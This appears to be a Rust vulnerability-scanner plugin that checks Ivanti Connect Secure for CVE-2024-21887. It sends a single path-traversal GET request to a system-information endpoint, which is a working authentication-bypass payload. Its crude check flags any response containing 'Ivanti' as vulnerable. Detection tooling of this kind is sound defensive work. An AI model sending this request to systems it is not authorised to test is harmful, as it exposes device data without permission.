/* http-vuln-cve2024-21887-4 - Ivanti Connect Secure command injection probe. */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    if !valid(ctx) {
        return 1;
    }
    let resp = match http_request(ctx, "GET", "/api/v1/totp/user-backup-code/../../system/system-information", None, "", "", None, 8192) {
        Some(r) if !r.is_empty() => r,
        _ => {
            set_out(ctx, "http-vuln-cve2024-21887-4: no HTTP response");
            return 0;
        }
    };
    let code = http_status(&resp);
    if contains_ci(&resp, "Ivanti") {
        set_out(ctx, &format!("VULNERABLE: /api/v1/totp/user-backup-code/../../system/system-information [{}] (CVE-2024-21887)", code));
    } else {
        set_out(ctx, &format!("not vulnerable: CVE-2024-21887 (/api/v1/totp/user-backup-code/../../system/system-information [{}])", code));
    }
    0
}
